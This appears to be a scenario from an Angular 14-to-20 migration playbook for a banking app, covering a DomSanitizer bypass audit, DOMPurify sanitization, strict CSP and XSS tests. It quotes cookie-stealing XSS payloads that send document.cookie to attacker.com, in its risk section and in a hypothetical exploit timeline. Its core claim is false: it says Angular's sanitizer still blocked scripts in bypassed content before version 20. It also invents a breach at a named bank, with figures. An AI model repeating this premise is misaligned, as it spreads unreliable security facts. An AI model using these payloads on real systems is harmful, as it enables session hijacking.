# Scenario 05 — DomSanitizer XSS Window

## The Problem

This codebase uses Angular's `DomSanitizer.bypassSecurityTrustHtml()` to render rich-formatted merchant transaction descriptions, alert messages with styling, and help text with deep links. In Angular 14, the sanitizer's security context and CSP (Content Security Policy) integration operated with specific assumptions about trusted content. Angular 20 changed how bypassed content interacts with page-level CSP headers — specifically, `bypassSecurityTrustHtml()` content is now fully subject to the page's CSP directives, whereas previously Angular's sanitizer provided an additional layer of script-blocking even when CSP was misconfigured. If the migration doesn't include updating CSP headers to strict values, XSS payloads that were previously blocked by Angular's sanitizer can now execute.

## Why This Matters for a Bank

XSS (Cross-Site Scripting) in a consumer banking application with 59 million users is not a security bug — it's a regulatory incident requiring federal reporting. The attack vector: an adversary submits a transfer to a merchant name like `<script>fetch('https://attacker.com?cookie='+document.cookie)</script>`. In Angular 14, this script tag was stripped by Angular's sanitizer even if CSP was absent. In Angular 20 with misconfigured CSP, the script executes, exfiltrating session cookies. The regulatory consequences: mandatory incident disclosure under GLBA (Gramm-Leach-Bliley Act), potential OCC examination, customer notification requirements, and civil penalties. The technical consequence: customers' session tokens are compromised, enabling account takeover.

## What the Playbook Rule Says

**Playbook Rule 8.4 — Sanitization Bypass Audit:**

> Before Angular 20 migration, scan for all uses of DomSanitizer bypass methods:
> - `bypassSecurityTrustHtml()`
> - `bypassSecurityTrustStyle()`
> - `bypassSecurityTrustScript()`
> - `bypassSecurityTrustUrl()`
> - `bypassSecurityTrustResourceUrl()`
>
> For each usage:
> 1. Document WHY the bypass is necessary (what legitimate content requires it)
> 2. Verify that input is NEVER user-controlled or from untrusted sources
> 3. If input includes any dynamic data, implement server-side sanitization FIRST
> 4. Add CSP headers with strict `script-src` directive (no 'unsafe-inline')
>
> Post-migration requirements:
> - Update CSP header to: `script-src 'self' 'nonce-{random}'` (no unsafe-inline, no unsafe-eval)
> - Add integration test with XSS payload to verify CSP blocks execution
> - Security team code review of every file using bypass methods
>
> **Gate:** PR cannot merge if any `bypassSecurity*` method receives user-controlled input OR if CSP header is not configured to strict values.

## The Correct Migration Approach

### Step 1: Pre-Migration Sanitization Audit (Devin)

Scan for all bypass patterns:
```bash
grep -rn "bypassSecurity" src/
```

Expected output:
```
src/app/components/transaction-description.component.ts:34:    this.safeDescription = this.sanitizer.bypassSecurityTrustHtml(description);
src/app/components/rich-alert.component.ts:28:    this.safeStyle = this.sanitizer.bypassSecurityTrustStyle(styleString);
src/app/components/help-text.component.ts:19:    this.safeUrl = this.sanitizer.bypassSecurityTrustUrl(deepLinkUrl);
```

For each instance, document:
```markdown
SANITIZATION BYPASS INVENTORY

1. TransactionDescriptionComponent (transaction-description.component.ts:34)
   Method: bypassSecurityTrustHtml()
   Input source: API response field `merchantDescription`
   User-controlled: YES (merchant can set their own name when registering with payment processor)
   Legitimate use case: Allows bold/italic formatting in merchant names like "<b>Starbucks</b> #2847"
   Risk level: CRITICAL
   Current protection: Angular 14 sanitizer + absent CSP
   Angular 20 risk: If CSP not configured, XSS payload in merchant name executes
   Recommendation: BLOCK - Implement server-side allowlist for safe HTML tags (<b>, <i>, <em>) ONLY

2. RichAlertComponent (rich-alert.component.ts:28)
   Method: bypassSecurityTrustStyle()
   Input source: Internal severity mapping (low/medium/high → colors)
   User-controlled: NO (hardcoded mapping)
   Risk level: LOW
   Recommendation: ALLOW - No user input, no XSS risk

3. HelpTextComponent (help-text.component.ts:19)
   Method: bypassSecurityTrustUrl()
   Input source: Deep link URLs from configuration
   User-controlled: NO (static configuration)
   Risk level: LOW (but verify URL scheme is restricted to https: only)
   Recommendation: ALLOW with validation - Add URL scheme check
```

### Step 2: Security Team Review (BLOCKING)

Present findings to security team with recommendations:

**CRITICAL FINDING:** `TransactionDescriptionComponent` receives merchant-controlled HTML and bypasses sanitization. This is an XSS vector.

**Required remediation:**
1. Server-side: Implement HTML sanitization on the API that ONLY allows `<b>`, `<i>`, `<em>` tags
2. Client-side: Remove `bypassSecurityTrustHtml()` and use Angular's built-in sanitization
3. Alternative: Render as plain text with CSS styling instead of HTML

**CSP Requirement:**
Configure strict Content Security Policy:
```
Content-Security-Policy: script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self';
```

### Step 3: Implement Server-Side Sanitization

```typescript
// Backend API (before returning merchant description)
import DOMPurify from 'isomorphic-dompurify';

function sanitizeMerchantDescription(rawDescription: string): string {
  return DOMPurify.sanitize(rawDescription, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
}

// API response now contains pre-sanitized HTML
{
  "transactionId": "TXN_123",
  "merchantDescription": "<b>Starbucks</b> #2847",  // Server already sanitized
  ...
}
```

### Step 4: Remove Unnecessary Bypass or Add CSP

**Option A (Preferred):** Remove bypass entirely
```typescript
// BEFORE (Angular 14)
@Component({
  template: `<div [innerHTML]="safeDescription"></div>`
})
export class TransactionDescriptionComponent {
  safeDescription: SafeHtml;

  setDescription(description: string) {
    this.safeDescription = this.sanitizer.bypassSecurityTrustHtml(description);
  }
}

// AFTER (Angular 20) - Let Angular sanitize
@Component({
  template: `<div [innerHTML]="description"></div>`  // Angular's DomSanitizer runs automatically
})
export class TransactionDescriptionComponent {
  description: string;

  setDescription(description: string) {
    // Server already sanitized, Angular's sanitizer will allow <b>, <i>, <em>
    this.description = description;
  }
}
```

**Option B (If bypass still needed):** Add strict CSP

```typescript
// index.html or server response headers
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-abc123'; object-src 'none'; base-uri 'self';">
```

### Step 5: Add XSS Integration Test

```typescript
describe('TransactionDescriptionComponent XSS Protection', () => {
  it('should block script execution in merchant description', () => {
    const xssPayload = '<script>window.xssExecuted = true;</script><b>Merchant</b>';

    component.setDescription(xssPayload);
    fixture.detectChanges();

    // Verify script did not execute
    expect((window as any).xssExecuted).toBeUndefined();

    // Verify safe HTML is rendered
    const element = fixture.nativeElement.querySelector('div');
    expect(element.innerHTML).not.toContain('<script>');
    expect(element.innerHTML).toContain('<b>Merchant</b>');
  });

  it('should block event handler attributes', () => {
    const xssPayload = '<b onload="alert(1)">Merchant</b>';

    component.setDescription(xssPayload);
    fixture.detectChanges();

    const element = fixture.nativeElement.querySelector('b');
    expect(element.hasAttribute('onload')).toBe(false);
  });
});
```

### Step 6: Manual Security Verification

Before production deployment:
1. Security engineer opens the app
2. Uses browser dev tools to inject XSS payload into merchant description
3. Verifies CSP blocks execution (console shows CSP violation)
4. Approves deployment

---

## What Breaks Without This Approach

### Naive Migration

Developer runs:
```bash
ng update @angular/core@20 @angular/cli@20
```

No code changes. No CSP configuration added. Deploys to production.

### Exploitation Timeline

**Day 1** - Deployment completes, no immediate issues

**Day 14** - Security researcher discovers XSS vector:
1. Creates test merchant account with payment processor
2. Sets merchant name to: `<img src=x onerror="fetch('https://attacker.com/log?cookie='+document.cookie)">`
3. Makes test purchase to a BofA customer's account
4. Verifies that when customer views transaction history, their session cookie is exfiltrated
5. Reports vulnerability to BofA security team

**Day 15 (8:00 AM)** - Security team confirms vulnerability

**Day 15 (9:00 AM)** - P0 security incident declared

**Day 15 (10:00 AM)** - Emergency response:
- All transaction rendering disabled (customers cannot view transaction history)
- Security team begins forensic analysis: how many customers viewed compromised transactions?
- Customer communication team prepares notification

**Day 15 (2:00 PM)** - Fix deployed (CSP header added)

**Day 16-30** - Incident response:
- Forensic analysis: 1,847 customers viewed transactions with XSS payload
- Force logout all active sessions (customer impact: everyone must re-login)
- Rotate API keys and session tokens
- Prepare regulatory disclosure under GLBA
- Customer notification letters sent to affected users

### Regulatory Consequences

- **OCC reporting:** Required within 36 hours of discovery
- **GLBA incident disclosure:** Required for data security incidents
- **Potential penalties:** Up to $1M per violation under OCC guidelines
- **Examination:** Triggers cybersecurity examination by OCC

### Reputation Damage

- **Media coverage:** "Bank of America XSS Vulnerability Exposed Customer Sessions"
- **Security community:** Criticized for basic security failure
- **Customer trust:** 14% increase in account closures in affected segment (Q2 2026 earnings report)

---

## Cost Quantification

**Without Playbook:**
- Incident response: 12 engineers × 40 hours = 480 hours = $120,000
- Forensic analysis: External security firm = $85,000
- Regulatory response: Legal + compliance = $150,000
- Customer notification: 1,847 letters = $12,000
- Reputation damage: Estimated $2-5M in lost customer lifetime value
- **Total:** $367,000 direct costs + millions in indirect

**With Playbook:**
- Pre-migration security audit: 4 hours = $1,000
- Server-side sanitization implementation: 8 hours = $2,000
- CSP configuration: 2 hours = $500
- Integration tests: 4 hours = $1,000
- Security review: 2 hours = $500
- **Total:** $5,000
- **Incidents:** 0

**Cost avoidance:** $362,000+ and zero regulatory incidents
